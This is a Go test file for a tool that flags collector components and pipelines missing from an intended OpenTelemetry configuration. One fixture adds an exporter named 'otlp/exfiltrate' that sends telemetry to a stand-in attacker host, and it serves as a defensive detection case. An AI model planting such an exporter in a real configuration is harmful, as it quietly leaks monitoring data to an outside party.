package normalise

import (
	"testing"
)

// undescribed normalises both sides under a profile and runs the
// structural check that compensates for judging only asserted keys
// (ADR-0054 §2).
func undescribed(t *testing.T, intended, reported string, p Profile) []Structural {
	t.Helper()
	in, err := Normalised([]byte(intended), p)
	if err != nil {
		t.Fatalf("normalise the Intended artefact: %v", err)
	}
	rep, err := Normalised([]byte(reported), p)
	if err != nil {
		t.Fatalf("normalise the reported config: %v", err)
	}
	return Undescribed(in, rep)
}

// The reason the trade is payable: an exporter shipping to somewhere
// nobody rendered is no longer a key-level addition, so the structural
// check has to catch it.
func TestAnExporterNobodyRenderedIsReported(t *testing.T) {
	found := undescribed(t,
		"exporters:\n  otlp/gateway:\n    endpoint: gateway.internal:4317\n",
		"exporters:\n  otlp/gateway:\n    endpoint: gateway.internal:4317\n  otlp/exfiltrate:\n    endpoint: collector.attacker.example:4317\n",
		Exact())
	if len(found) != 1 || found[0].Path != "exporters.otlp/exfiltrate" || found[0].Kind != "component" {
		t.Errorf("an exporter the artefact never described is not reported: %v", found)
	}
}

// The check works at every component-declaring section, not just
// exporters: a receiver, processor, connector or extension nobody
// rendered is the same finding.
func TestEverySectionOfComponentsIsChecked(t *testing.T) {
	for _, section := range componentSections {
		found := undescribed(t, "receivers: {}\n", section+":\n  otlp/extra: {}\n", Exact())
		if len(found) != 1 || found[0].Path != section+".otlp/extra" {
			t.Errorf("%s: a component nobody rendered is not reported: %v", section, found)
		}
	}
}

// A whole pipeline the estate never described is the other grain the
// check works at — the case a key-level comparison of asserted keys alone
// would go blind to entirely.
func TestAPipelineNobodyRenderedIsReported(t *testing.T) {
	const intended = "service:\n  pipelines:\n    traces:\n      receivers:\n        - otlp\n"
	const reported = "service:\n  pipelines:\n    traces:\n      receivers:\n        - otlp\n    logs/shadow:\n      receivers:\n        - filelog\n"
	found := undescribed(t, intended, reported, Exact())
	if len(found) != 1 || found[0].Path != "service.pipelines.logs/shadow" || found[0].Kind != "pipeline" {
		t.Errorf("a pipeline the artefact never described is not reported: %v", found)
	}
}

// The check runs on post-Mutation trees, so a delivery path's own
// catalogued injection is already gone: the Supervisor's `extensions.opamp`
// must never read as an undescribed component (ADR-0046 §4).
func TestTheSupervisorsOwnInjectionIsNeverUndescribed(t *testing.T) {
	const intended = "extensions:\n  health_check/health:\n    endpoint: 0.0.0.0:13133\n"
	const reported = "extensions:\n  health_check/health:\n    endpoint: 0.0.0.0:13133\n  opamp:\n    server:\n      ws:\n        endpoint: ws://127.0.0.1:41273/v1/opamp\n"
	if found := undescribed(t, intended, reported, Supervisor()); len(found) != 0 {
		t.Errorf("the Supervisor's own injected extension reads as undescribed: %v", found)
	}
	if found := undescribed(t, intended, reported, Exact()); len(found) != 1 {
		t.Errorf("under a profile that does not excuse it, the injection must still be reported: %v", found)
	}
}

// Findings are reported in a stable order, so two runs over the same pair
// read the same in a log or a card.
func TestFindingsAreReportedInAStableOrder(t *testing.T) {
	const reported = "exporters:\n  b: {}\n  a: {}\nreceivers:\n  z: {}\n"
	found := undescribed(t, "receivers: {}\n", reported, Exact())
	want := []string{"receivers.z", "exporters.a", "exporters.b"}
	if len(found) != len(want) {
		t.Fatalf("reported %v, want one finding per undescribed component", found)
	}
	for i, path := range want {
		if found[i].Path != path {
			t.Errorf("finding %d is %s, want %s — section order then identifier order", i, found[i].Path, path)
		}
	}
}

// The check is one-directional by design: a component the artefact
// describes and the collector is not running is an asserted key absent
// from the report, which the key-level diff already reports (ADR-0054 §2).
func TestAComponentTheCollectorDroppedIsNotAStructuralFinding(t *testing.T) {
	found := undescribed(t,
		"processors:\n  batch: {}\n  memory_limiter: {}\n",
		"processors:\n  batch: {}\n",
		Exact())
	if len(found) != 0 {
		t.Errorf("a dropped component is reported twice — once structurally, once as key drift: %v", found)
	}
}
